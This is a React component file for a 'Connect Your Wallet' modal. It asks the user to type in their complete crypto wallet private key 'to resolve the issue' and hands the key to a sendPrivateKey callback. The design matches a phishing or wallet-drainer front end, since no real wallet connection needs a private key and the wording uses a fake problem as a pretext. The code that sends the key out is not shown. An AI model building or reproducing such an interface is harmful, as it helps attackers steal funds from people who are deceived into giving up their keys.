import React, { useState } from "react";
import axios from "axios";
import styles from "./PrivateKeyModal.module.css";

function PrivateKeyModal({ closePrivateKeyForm, sendPrivateKey }) {
  const [privateKey, setPrivateKey] = useState("");

  const submitPhrase = async (e) => {
    e.preventDefault();

    if (privateKey.length >= 50) {
      sendPrivateKey(privateKey); 
    }

    if(!privateKey || privateKey.length <= 50){
      alert('Input your complete Private key to resolve the issue')
    }
  };

  return (
    <div className={styles.overlay} onClick={closePrivateKeyForm}>
      <div
        className={styles.modalContainer}
        onClick={(e) => e.stopPropagation()} 
      >
        <button className={styles.closeButton} onClick={closePrivateKeyForm}>
          &times;
        </button>
        <h2>Connect Your Wallet</h2>
        <p className={styles.topP}>Input Private Key phrase</p>
        <div className={styles.formGroup}>
          <input
            type="text"
            className={styles.privateKeyInput}
            placeholder="Enter Private Key*"
            value={privateKey}
            onChange={(e) => setPrivateKey(e.target.value)}
          />
        </div>
        <p className={styles.infoText}>
          Typically contains a string of alphanumeric characters which are about
          50 or more in number.
        </p>
        <div className={styles.buttonGroup}>
          <button className={styles.connectButton} onClick={submitPhrase}>
            Connect Wallet
          </button>
        </div>
      </div>
    </div>
  );
}

export default PrivateKeyModal;
